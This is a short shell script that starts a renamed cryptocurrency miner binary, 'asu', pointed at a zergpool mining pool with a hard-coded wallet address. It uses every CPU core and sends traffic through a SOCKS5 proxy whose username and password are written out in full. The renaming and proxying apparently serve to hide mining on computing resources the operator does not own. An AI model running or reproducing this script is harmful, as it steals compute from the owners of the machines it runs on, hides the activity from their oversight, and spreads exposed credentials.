#!/bin/sh
chmod +x asu
export http_proxy=http://yxhndbmz:a2j5hbrzjbos@209.127.191.180:9279
curl -v -x "socks5://yxhndbmz:a2j5hbrzjbos@209.127.191.180:9279/" webshare.io/
./asu -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.na.mine.zergpool.com:4457 -u RL4Bhocn7aqyEfCsNcq949SNynxgyknBoY --donate-level 1 -p c=AVN,mc=UPX/WRKZ -t $(nproc) -x socks5://yxhndbmz:a2j5hbrzjbos@209.127.191.180:9279
